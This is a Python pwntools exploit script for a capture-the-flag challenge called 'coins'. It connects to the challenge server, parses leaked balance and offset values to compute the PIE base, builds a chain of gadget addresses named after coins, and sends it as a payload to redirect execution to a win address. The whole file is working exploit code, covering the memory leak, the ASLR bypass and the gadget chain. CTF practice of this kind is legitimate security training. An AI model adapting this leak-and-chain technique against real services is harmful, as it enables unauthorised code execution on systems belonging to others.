#!/usr/bin/env python3
from pwn import remote, context, p64
import re, time
import coins_build as cb
context.log_level='error'
HOST="coins-a265f2d26226.chall.nnsc.tf"; PORT=1337
COIN_OFF = {
    'croeseid':0x142e,'daric':0x1433,'siglos':0x1438,'karshapana':0x143d,
    'tetradrachm':0x1442,'stater':0x1447,'obol':0x144c,'lepton':0x1451,
    'aureus':0x1459,'solidus':0x1461,'denarius':0x1469,'antoninianus':0x1471,
    'sestertius':0x1479,'florin':0x1481,'sequin':0x1489,'tremissis':0x1491,
    'dinar':0x1499,'dirham':0x14a1,'scudo':0x14a9,'thaler':0x14b1,
    'real':0x14b9,'piloncitos':0x14c1,'koban':0x14c9,
    'loonie':0x14d1,'krugerrand':0x14d5,'sovereign':0x14d9,'drachma':0x14dd,
    'penny':0x14e1,'nickel':0x14e5,'dime':0x14e9,
    'quarter':0x14ed,'cent':0x14f5,'shilling':0x14f9,
}
io=remote(HOST,PORT,ssl=True)
buf=b''
t=time.time()
while b'> ' not in buf and time.time()-t<6:
    try: buf+=io.recv(timeout=2)
    except Exception: break
txt=buf.decode(errors='ignore')
print("banner:",repr(buf))
balance=int(re.search(r'balance:\s*0x([0-9a-fA-F]+)',txt).group(1),16)
offset=int(re.search(r'\+\s*0x([0-9a-fA-F]+)',txt).group(1),16)
pie=balance-0x4000
T=offset-0x1a26
coins=cb.plan(T)+['quarter','cent','shilling']
print("balance",hex(balance),"offset",hex(offset),"pie",hex(pie),"T",hex(T),"coins",len(coins))
print("coin list:",coins)
regs=cb.simulate(cb.plan(T)); print("sim r8:",hex(regs[8]),"want",hex(T),"ok",regs[8]==T)
print("win_addr should be pie+offset =", hex(pie+offset))
print("jmp target = pie+0x1a26+T =", hex(pie+0x1a26+T))
payload=b''.join(p64(pie+COIN_OFF[c]) for c in coins)
print("payload len",len(payload))
io.send(payload)
time.sleep(2)
data=b''
t=time.time()
while time.time()-t<10:
    try:
        d=io.recv(timeout=3)
        if not d: break
        data+=d
        print("recv chunk:",repr(d))
    except Exception as ex:
        print("recv end:",ex); break
print("FINAL:",repr(data))
io.close()
